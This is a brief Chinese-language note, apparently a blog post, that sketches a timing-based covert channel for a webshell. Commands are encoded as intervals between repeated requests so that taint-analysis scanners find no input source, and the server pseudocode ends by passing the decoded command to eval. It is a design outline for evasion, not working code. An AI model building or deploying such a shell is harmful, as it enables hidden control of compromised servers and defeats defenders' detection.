# 总体思路
当前一些webshell查杀高级的一些会基于污点传播理论。

污点源标记  -->  污点传递 -->  敏感函数汇聚点检查

污点外部来源有很多途径：get，post，cookie，测信通道，dns等等。

现在设想下如果有一种通信是基于 无任何输入源，即webshell file代码里不从http请求报文中获取任何信息，不主动向外网请求任何资源。是不是认为就没有污点源呢？
我们可以设计一个类似电报一样的协议去表达二进制：01110111 为：du.du..du..du..du.du..du..du..du。  一个"du"代表一个shell.php请求，一个"."代表一个时间单位。

前置条件: 已经上传了一个shell.php
1. 抽样统计出服务端一个http请求的大概延时，timeunit(".") = 5ms
2. 将控制命令转换为二进制编码： “whoami" --> "01110111 01101000 01101111 01100001 01101101 01101001"
3. 二进制转换为du编码："01110111 01101000 01101111 01100001 01101101 01101001" --> "du.du..du..du..du.du..du..du..du  省略"
4. du协议开始 send("<>")
5. 持续发送du协议 命令报文
6. du协议终止 send("</>")
7. webshell.php 将du协议数据转换为01 二进制
8. 命令执行

#client端伪代码：

## "du..du"

curl("webshell.php")
wait_for(mean_delay * 3)
curl("webshell.php")

## "du.du"

curl("webshell.php");
nop;
curl("webshell.php");

## 完整性纠正

如果两次请求因为网络或者其他原因导致延时，协议转换出错，客户端简单粗暴丢弃整个会话，重新开始。

#webshell.php 伪代码：

du_queue = ()
session_end = false
last_time = null
diff_time = cur_time - last_time
if diff_time <= mean_delay * 2
    du_queue.push(".du")
else if diff_time > mean_delay * 3 and diff_time < mean_delay * 4
    du_queue.push("..du")
    
if is_session_end(du_queue)
    session_end = true

//如果会话超时即自动清除上下文

time_out_cancel()

if  session_end
    binary = trans(du_queue)
    eval(binary)
    response.print("session end")
else 
    response.print("ok") 

# 总结

以上是一个设想思路先记录下来。数据传输的完整性基本上依赖

# 参考
[基于污点传递做webshell查杀](https://zhuanlan.zhihu.com/p/197553954?utm_source=wechat_session&utm_medium=social&utm_oi=62771915915264&utm_campaign=shareopn)
